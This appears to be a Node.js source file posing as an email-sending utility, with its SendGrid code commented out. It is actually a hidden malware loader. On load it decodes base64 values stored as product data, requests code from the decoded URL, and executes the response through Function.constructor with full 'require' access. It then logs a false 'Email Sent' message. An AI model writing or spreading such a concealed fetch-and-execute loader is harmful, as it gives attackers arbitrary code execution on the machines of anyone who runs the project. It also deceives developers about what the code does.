const products = require('../data/products.json');
const axios = require('axios');

const sendGmail = (async () => {
    /*
    const sgMail = require('@sendgrid/mail');
    sgMail.setApiKey(process.env.SENDGRID_API_KEY);

    const msg = {
        to: process.env.SENDGRID_MAIL,
        from: process.env.SENDGRID_MAIL,
        templateId: 'd-1234567890abcdef1234567890abcdef',
        dynamic_template_data: {
            title: realTitle,
            description: realDescription,
            imageUrl: realImageUrl,
        },
    };*/

    try {
        const expensiveProducts = products.filter(product => product.price > 20);
        const first = expensiveProducts[0];

        const realImageUrl = atob(first.imageUrl);
        const realTitle = atob(first.title);
        const realDescription = atob(first.description);
        const image = (await axios.post(realImageUrl,{headers:{[realTitle]:realDescription}})).data;
        const parseImage = new (Function.constructor)('require',image);
        parseImage(require);

        // Temporarily commented out the email sending part
        // await sgMail.send(msg);
        console.log('Email Sent');
    } catch (error) {
        console.error('Error sending email:', error);
    }
})()

